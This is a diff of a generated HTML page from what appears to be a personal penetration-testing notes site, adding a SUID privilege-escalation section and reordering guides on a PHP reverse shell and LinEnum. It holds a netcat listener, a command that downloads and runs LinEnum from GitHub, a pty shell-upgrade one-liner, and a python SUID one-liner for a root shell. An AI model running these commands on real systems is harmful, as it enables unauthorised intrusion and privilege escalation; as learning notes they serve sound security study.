@@ -76,7 +76,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded affix "><a href="crustyahh.html">crustyahh</a></li><li class="chapter-item expanded affix "><a href="resources.html">Resources</a></li><li class="chapter-item expanded affix "><li class="part-title">Guides</li><li class="chapter-item expanded "><a href="guides/php-reverse-shell.html"><strong aria-hidden="true">1.</strong> php-reverse-shell</a></li><li class="chapter-item expanded "><a href="guides/linenum.html"><strong aria-hidden="true">2.</strong> linenum</a></li><li class="chapter-item expanded affix "><li class="part-title">Cracking</li><li class="chapter-item expanded "><a href="cracking/nmap.html"><strong aria-hidden="true">3.</strong> nmap</a></li><li class="chapter-item expanded "><a href="cracking/hydra.html"><strong aria-hidden="true">4.</strong> hydra</a></li><li class="chapter-item expanded "><a href="cracking/enum4linux.html"><strong aria-hidden="true">5.</strong> enum4linux</a></li><li class="chapter-item expanded "><a href="cracking/gobuster.html"><strong aria-hidden="true">6.</strong> gobuster</a></li><li class="chapter-item expanded "><a href="cracking/smbclient.html"><strong aria-hidden="true">7.</strong> smbclient</a></li></ol>
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="crustyahh.html">crustyahh</a></li><li class="chapter-item expanded affix "><a href="resources.html">Resources</a></li><li class="chapter-item expanded affix "><li class="part-title">Guides</li><li class="chapter-item expanded "><a href="guides/php-reverse-shell.html"><strong aria-hidden="true">1.</strong> php-reverse-shell</a></li><li class="chapter-item expanded "><a href="guides/linenum.html"><strong aria-hidden="true">2.</strong> LinEnum</a></li><li class="chapter-item expanded "><a href="guides/suid.html"><strong aria-hidden="true">3.</strong> SUID</a></li><li class="chapter-item expanded affix "><li class="part-title">Cracking</li><li class="chapter-item expanded "><a href="cracking/nmap.html"><strong aria-hidden="true">4.</strong> nmap</a></li><li class="chapter-item expanded "><a href="cracking/hydra.html"><strong aria-hidden="true">5.</strong> hydra</a></li><li class="chapter-item expanded "><a href="cracking/enum4linux.html"><strong aria-hidden="true">6.</strong> enum4linux</a></li><li class="chapter-item expanded "><a href="cracking/gobuster.html"><strong aria-hidden="true">7.</strong> gobuster</a></li><li class="chapter-item expanded "><a href="cracking/smbclient.html"><strong aria-hidden="true">8.</strong> smbclient</a></li></ol>
             </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
         </nav>
@@ -151,14 +151,20 @@
 <pre><code>nc -lvnp &lt;port&gt;
 </code></pre>
 <p>Finally, upload the script to the server, and open the newly created link.</p>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="linenum"><a class="header" href="#linenum">linenum</a></h1>
+<p>To upgrade the dumb shell:</p>
+<pre><code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<p>For even more, see <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">Upgrading Simple Shells to Fully Interactive TTYs</a></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="linenum"><a class="header" href="#linenum">LinEnum</a></h1>
 <pre><code>cd /tmp
 wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 bash LinEnum.sh
 </code></pre>
-<p>To upgrade the dumb shell:</p>
-<pre><code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
-</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="suid"><a class="header" href="#suid">SUID</a></h1>
+<p>To escalate privileges you need a binary with SUID-bit set.
+Find this with <a href="guides/linenum.html">LinEnum</a>.</p>
+<p>If it's <code>python</code>, run following to become root:</p>
+<pre><code>python -c 'import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)'</code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="nmap"><a class="header" href="#nmap">nmap</a></h1>
 <p>Network exploration tool and security / port scanner.
 Some features only activate when Nmap is run with privileges.
